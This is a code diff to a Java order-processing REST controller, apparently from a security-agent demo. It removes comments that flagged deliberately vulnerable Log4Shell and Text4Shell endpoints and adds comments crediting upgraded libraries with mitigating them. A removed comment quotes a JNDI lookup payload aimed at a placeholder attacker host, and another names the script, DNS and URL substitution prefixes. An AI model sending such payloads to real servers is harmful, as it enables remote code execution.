@@ -11,16 +11,10 @@ import java.util.Map;
 
 /**
  * REST endpoints for the Order Processor.
- *
- * <p>These handlers intentionally demonstrate the vulnerable dependencies so
- * the Security Agent has both dependency findings and reachable code paths to
- * reason about.
  */
 @RestController
 public class OrderController {
 
-    // Log4Shell: logging attacker-controlled input on a vulnerable log4j-core
-    // version allows JNDI lookups such as ${jndi:ldap://attacker/x}.
     private static final Logger LOGGER = LogManager.getLogger(OrderController.class);
 
     @GetMapping("/health")
@@ -31,8 +25,8 @@ public class OrderController {
     /**
      * Echoes a note back to the caller.
      *
-     * <p>VULNERABLE (CVE-2021-44228): user input is passed straight to the
-     * logger, which on log4j-core 2.14.1 evaluates ${...} lookups.
+     * <p>User input is logged. On log4j-core 2.17+, message lookup is disabled
+     * by default, mitigating CVE-2021-44228.
      */
     @GetMapping("/orders/note")
     public String note(@RequestParam("value") String value) {
@@ -43,8 +37,9 @@ public class OrderController {
     /**
      * "Renders" a templated label for an order.
      *
-     * <p>VULNERABLE (CVE-2022-42889 / Text4Shell): commons-text 1.9 resolves
-     * ${script:...}, ${dns:...}, and ${url:...} prefixes during substitution.
+     * <p>Uses a map-only StringSubstitutor (no script/DNS/URL interpolators).
+     * On commons-text 1.10+, the dangerous default interpolators are disabled,
+     * mitigating CVE-2022-42889.
      */
     @GetMapping("/orders/label")
     public String label(@RequestParam("template") String template) {
